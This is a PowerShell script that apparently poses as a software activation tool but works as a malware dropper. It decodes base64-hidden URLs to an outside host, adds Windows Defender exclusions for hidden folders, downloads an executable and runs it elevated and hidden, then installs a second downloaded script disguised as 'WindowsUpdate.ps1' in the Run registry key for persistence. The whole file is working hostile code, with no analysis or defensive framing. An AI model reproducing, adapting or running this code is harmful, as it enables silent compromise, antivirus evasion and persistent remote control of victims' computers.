function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
    } catch {}
}

function Download-FileWithRetries {
    param(
        [string]$Url,
        [string]$Output,
        [int]$Retries = 3,
        [int]$DelaySeconds = 5
    )

    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Invoke-WebRequest -Uri $Url -OutFile $Output -UseBasicParsing -ErrorAction Stop
            if (Test-Path $Output) { return $true }
        } catch {
            Start-Sleep -Seconds $DelaySeconds
        }
    }
    return $false
}

$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly91bmRvLnNnL2ZpbGUuZXhl"))
$scriptUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly91bmRvLnNnL3NjcmlwdC5wczE="))
$updaterExe = "updater.exe"
$trustedName = "WindowsUpdate.ps1"
$persistFolder = Join-Path $env:APPDATA "UpdateCache"

New-Item -ItemType Directory -Path $persistFolder -Force | Out-Null
Set-ItemProperty -Path $persistFolder -Name Attributes -Value Hidden
Add-Exclusion -Path $persistFolder

$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType Directory -Path $hiddenFolder | Out-Null
Add-Exclusion -Path $hiddenFolder

$tempPath = Join-Path $hiddenFolder $updaterExe

if (Download-FileWithRetries -Url $downloadUrl -Output $tempPath) {
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value Hidden
    Set-ItemProperty -Path $tempPath -Name Attributes -Value Hidden

    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $tempPath
    $startInfo.WindowStyle = 'Hidden'
    $startInfo.Verb = 'runas'

    $process = [System.Diagnostics.Process]::Start($startInfo)
    $process.WaitForExit()

    if ($process.ExitCode -eq 0) {
        $persistScriptPath = Join-Path $persistFolder $trustedName
        if (Download-FileWithRetries -Url $scriptUrl -Output $persistScriptPath) {
            Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value Hidden
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScriptPath`""
            Set-ItemProperty -Path $regPath -Name $trustedName -Value $regValue -Force
        }
    }
} else {
    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
    exit 1
}

Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue